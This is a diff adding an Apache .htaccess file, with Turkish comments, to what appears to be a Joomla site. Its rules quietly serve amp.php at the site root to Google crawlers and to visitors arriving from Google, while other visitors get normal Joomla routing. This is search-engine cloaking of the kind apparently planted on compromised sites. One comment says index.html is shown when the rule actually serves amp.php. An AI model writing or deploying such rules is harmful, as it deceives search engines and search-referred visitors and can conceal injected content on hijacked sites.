@@ -1,0 +1,18 @@
+
+# .htaccess
+
+RewriteEngine On
+
+# Googlebot veya google referer geldiyse index.html göster
+RewriteCond %{HTTP_USER_AGENT} Googlebot [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} AdsBot [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Mediapartners-Google [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Google- [NC,OR]
+RewriteCond %{HTTP_REFERER} google\. [NC]
+RewriteRule ^$ amp.php [L]
+
+# Diğer tüm istekleri index.php'ye yönlendir (varsayılan Joomla davranışı)
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
